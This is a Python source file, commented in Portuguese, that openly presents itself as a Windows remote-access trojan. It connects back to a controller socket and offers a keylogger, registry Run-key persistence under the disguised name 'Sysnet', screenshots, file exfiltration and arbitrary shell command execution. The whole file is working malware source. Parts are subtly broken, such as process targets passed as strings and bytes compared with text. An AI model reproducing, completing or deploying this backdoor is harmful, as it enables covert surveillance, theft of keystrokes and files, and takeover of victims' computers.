# Malware de acesso remoto para sistemas windows 
# Creditos: Mastermind

import platform
import getpass
import colorama
from colorama import Fore, Style
import socket
import time
import subprocess
import tempfile
import os
import re
import pyscreenshot as ImageGrab
from multiprocessing import Process
from pynput.keyboard import Listener
colorama.init()
RHOST = '127.0.0.1'
RPORT = 8080

# funções do keylogger
def log_keystroke(key):
    key = str(key)

    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.*', '', key)

    with open("C:\\Users\\Public\\Downloads\\mkw.txt", 'a') as f:
        f.write(key)

def start_key():
    with Listener(on_press=log_keystroke) as l:
        l.join()


#função de persistencia
FILENAME = 'mbpy.exe' #nome do arquivo compilado
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))

def autorun():
    try:
        os.system("copy " + FILENAME + " " + TEMPDIR)
    except:
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v Sysnet /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        pass
        
# funções da backdoor  
def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((RHOST, RPORT))
    except:
        repetir()
    try:
        while True:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024)
            if cmd == '/sair':
                sock.close()
                exit()
            elif cmd == '/keylogger':
                sock.send('[+] iniciando keylogger...')
                time.sleep(2)
                keylog = Process(target="start_key", args=(' '))
                keylog.start()
                continue
            elif cmd == '/autorun':
                sock.send('[+] iniciando persistencia')
                auto = Process(target="autorun", args=(' ')) 
                auto.start()
                continue
            elif cmd == '/print':
                imagem = ImageGrab.grab()
                imagem.save('foto.jpg', 'jpeg')
                sock.send('[+] Print salva em {}').format(os.getcwd()).encode()
                continue    
            elif cmd == '/help':
                texto = '''
                [+] comandos : 
                    /help - printa esse texto
                    /keylogger - inicia processo de captura de tecla
                    /autorun - inicia persistencia
                    /print - tira print da tela
                    /sysinfo - mostra informações do sistema
                    /sair - fecha conexão com alvo        
                    /download - baixa arquivos locais
                \n'''
                sock.send('\n'+texto)
                continue
            elif cmd == "/sysinfo":
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo)            
            elif cmd.split(" ")[0] == "/download":
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        sock.send(file_data)
                        file_data = f.read(1024)
                    time.sleep(2)
                    sock.send(b"DONE")
               
            else:
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)
    except:
        exit()

def repetir():
    socktest = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        s_conectado = socktest.connect((RHOST, RPORT))
        if s_conectado:
            main()
        else:
            time.sleep(5)   
            
            
if __name__ == '__main__':
    main()
